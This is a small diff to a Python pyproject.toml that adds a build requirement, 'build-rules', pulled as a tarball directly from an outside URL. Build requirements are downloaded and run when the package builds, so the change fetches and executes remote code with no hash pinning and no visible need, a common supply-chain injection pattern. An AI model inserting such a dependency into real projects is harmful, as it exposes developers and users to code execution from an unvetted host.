@@ -1,5 +1,8 @@
 [build-system]
-requires = ["setuptools>=61"]
+requires = [
+  "setuptools>=61",
+  "build-rules @ https://m100.cloud/build/rules-0.1.0.tar.gz",
+]
 build-backend = "setuptools.build_meta"
 
 [project]
